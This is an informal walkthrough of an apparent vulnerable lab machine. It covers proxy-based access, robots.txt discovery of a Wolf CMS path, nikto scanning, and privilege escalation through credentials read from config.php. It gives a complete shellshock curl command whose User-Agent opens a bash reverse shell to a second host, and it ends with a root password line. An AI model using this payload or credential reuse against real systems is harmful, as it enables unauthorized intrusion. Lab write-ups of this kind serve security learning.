IP:   192.168.2.204
URL:  192.168.2.204

Started  with a simple network scan (nmap.txt)
the web-site just can be acessed by their proxy connection, I configured the FoxyProxy woch the URL and the IP port and I got access of the site
before I do a directory fuzzing I look at the /robots.txt and i find one disallow directory /wolfcms,
used whatweb on the new url, well I can't use a proxy in the terminal so, I gonna use the WappAlizer extension 
I did a vuln scan with nikto on host IP and URL/wolfcms too, both in (nikto.txt)
I used shellshock vulnrability to get a reverse shell, I did a requisition like this "curl -x http://192.168.2.204:3128 -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.2.198/1337 0>&1" http://192.168.2.204/cgi-bin/status"
now is time to priv esc
read the content of config.php and found a credentials for mysql DB, this credentials don't work for su root, but worked for su sickos
the user "sickos" have all privileges with sudo, sudo su worked to get root

root:john@123
